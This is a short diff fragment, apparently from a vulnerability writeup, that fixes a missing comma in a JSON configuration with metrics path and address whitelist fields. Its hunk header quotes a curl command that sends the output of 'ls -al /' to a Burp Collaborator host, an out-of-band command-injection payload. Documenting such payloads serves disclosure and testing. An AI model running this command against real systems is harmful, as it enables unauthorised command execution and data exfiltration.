@@ -121,7 +121,7 @@ curl https://p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d "`ls -al /`"
 >    } 
 >  },
 >  "metrics":{ 
->    "path": "jnaicmez8"
+>    "path": "jnaicmez8",
 >    "addressWhitelist":["21.10.23.0/24"] 
 >  },
 >  "dns":{
